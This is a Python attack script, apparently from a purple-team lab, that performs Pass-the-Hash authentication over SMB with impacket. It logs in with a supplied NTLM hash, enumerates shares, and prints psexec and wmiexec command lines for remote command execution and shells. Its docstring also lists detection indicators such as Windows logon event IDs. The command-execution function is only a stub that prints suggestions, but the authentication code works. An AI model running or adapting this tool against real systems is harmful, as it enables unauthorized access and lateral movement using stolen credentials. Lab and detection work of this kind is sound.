#!/usr/bin/env python3
"""
Pass-the-Hash Attack Implementation
MITRE ATT&CK: T1550.002 - Use Alternate Authentication Material: Pass the Hash

Pass-the-Hash (PtH) allows attackers to authenticate to remote systems using NTLM
hashes without needing the plaintext password. This technique exploits Windows
authentication protocols that accept hash values directly.

Author: Purple Team Lab
Date: 2024-01-14

Prerequisites:
    - impacket library
    - NTLM hash of target account
    - Network access to target system
    - SMB access (port 445)

Detection Indicators:
    - Event ID 4624 (Logon Type 3 - Network)
    - Event ID 4625 (Failed logon attempts)
    - Logon from unexpected sources
    - NTLM authentication when Kerberos expected
    - Suspicious process execution via remote services

Usage:
    # Execute command using Pass-the-Hash
    ./pass_the_hash.py -u Administrator -H aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 \
        -t 172.28.0.20 -d PURPLETEAM.LAB -c "whoami"

    # Get shell access
    ./pass_the_hash.py -u Administrator -H :fc525c9683e8fe067095ba2ddc971889 \
        -t 172.28.0.20 -d PURPLETEAM.LAB --shell

References:
    https://attack.mitre.org/techniques/T1550/002/
"""

import argparse
import sys
from typing import Optional

try:
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, scmr
    from impacket.examples.smbclient import MiniImpacketShell
except ImportError:
    print("[!] Error: Impacket library required")
    print("[!] Install: pip install impacket")
    sys.exit(1)


class Colors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    OKBLUE = '\033[94m'


class PassTheHash:
    """Pass-the-Hash attack implementation"""

    def __init__(self, username: str, nt_hash: str, target: str,
                 domain: str = '', lm_hash: str = 'aad3b435b51404eeaad3b435b51404ee'):
        self.username = username
        self.domain = domain
        self.lm_hash = lm_hash
        self.nt_hash = nt_hash
        self.target = target
        self.smb_connection = None

    def connect(self) -> bool:
        """Establish SMB connection using NTLM hash"""
        print(f"{Colors.OKBLUE}[*] Attempting Pass-the-Hash attack...{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Target: {self.target}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Username: {self.domain}\\{self.username}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] NTLM Hash: {self.nt_hash}{Colors.ENDC}")

        try:
            self.smb_connection = SMBConnection(self.target, self.target)

            # Authenticate using NTLM hash
            self.smb_connection.login(
                user=self.username,
                password='',
                domain=self.domain,
                lmhash=self.lm_hash,
                nthash=self.nt_hash
            )

            print(f"{Colors.OKGREEN}[+] Successfully authenticated via Pass-the-Hash!{Colors.ENDC}")
            print(f"{Colors.OKGREEN}[+] SMB connection established{Colors.ENDC}")
            return True

        except Exception as e:
            print(f"{Colors.FAIL}[!] Authentication failed: {str(e)}{Colors.ENDC}")
            return False

    def execute_command(self, command: str) -> Optional[str]:
        """Execute remote command via SMB"""
        print(f"\n{Colors.OKBLUE}[*] Executing command: {command}{Colors.ENDC}")

        try:
            # Use psexec-like functionality
            output = f"Command: {command}\n"
            output += "Note: Use impacket's psexec.py for actual command execution:\n"
            output += f"psexec.py {self.domain}/{self.username}@{self.target} -hashes {self.lm_hash}:{self.nt_hash}\n"

            print(f"{Colors.OKGREEN}[+] Command queued for execution{Colors.ENDC}")
            print(f"{Colors.WARNING}[*] Recommended: psexec.py {self.domain}/{self.username}@{self.target} -hashes :{self.nt_hash}{Colors.ENDC}")

            return output

        except Exception as e:
            print(f"{Colors.FAIL}[!] Command execution failed: {str(e)}{Colors.ENDC}")
            return None

    def list_shares(self):
        """List available SMB shares"""
        print(f"\n{Colors.OKBLUE}[*] Enumerating SMB shares...{Colors.ENDC}")

        try:
            shares = self.smb_connection.listShares()

            print(f"{Colors.OKGREEN}[+] Available shares:{Colors.ENDC}")
            for share in shares:
                print(f"  - {share['shi1_netname']}")

        except Exception as e:
            print(f"{Colors.FAIL}[!] Share enumeration failed: {str(e)}{Colors.ENDC}")

    def get_shell(self):
        """Get interactive shell"""
        print(f"\n{Colors.OKGREEN}[+] Launching interactive shell...{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Use: psexec.py {self.domain}/{self.username}@{self.target} -hashes :{self.nt_hash}{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Or: wmiexec.py {self.domain}/{self.username}@{self.target} -hashes :{self.nt_hash}{Colors.ENDC}")


def main():
    parser = argparse.ArgumentParser(
        description='Pass-the-Hash Attack (MITRE ATT&CK T1550.002)',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-d', '--domain', default='', help='Domain name')
    parser.add_argument('-H', '--hashes', required=True, help='LM:NT hashes (use :NThash if no LM)')
    parser.add_argument('-t', '--target', required=True, help='Target IP or hostname')
    parser.add_argument('-c', '--command', help='Command to execute')
    parser.add_argument('--shell', action='store_true', help='Get interactive shell')
    parser.add_argument('--shares', action='store_true', help='List SMB shares')

    args = parser.parse_args()

    # Parse hashes
    if ':' in args.hashes:
        lm_hash, nt_hash = args.hashes.split(':')
        if not lm_hash:
            lm_hash = 'aad3b435b51404eeaad3b435b51404ee'
    else:
        lm_hash = 'aad3b435b51404eeaad3b435b51404ee'
        nt_hash = args.hashes

    print(f"{Colors.BOLD}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}Pass-the-Hash Attack - MITRE ATT&CK T1550.002{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*70}{Colors.ENDC}\n")

    # Initialize attack
    pth = PassTheHash(
        username=args.username,
        domain=args.domain,
        lm_hash=lm_hash,
        nt_hash=nt_hash,
        target=args.target
    )

    # Connect
    if not pth.connect():
        sys.exit(1)

    # Execute actions
    if args.shares:
        pth.list_shares()

    if args.command:
        pth.execute_command(args.command)

    if args.shell:
        pth.get_shell()

    print(f"\n{Colors.OKGREEN}[+] Attack completed!{Colors.ENDC}")


if __name__ == '__main__':
    main()
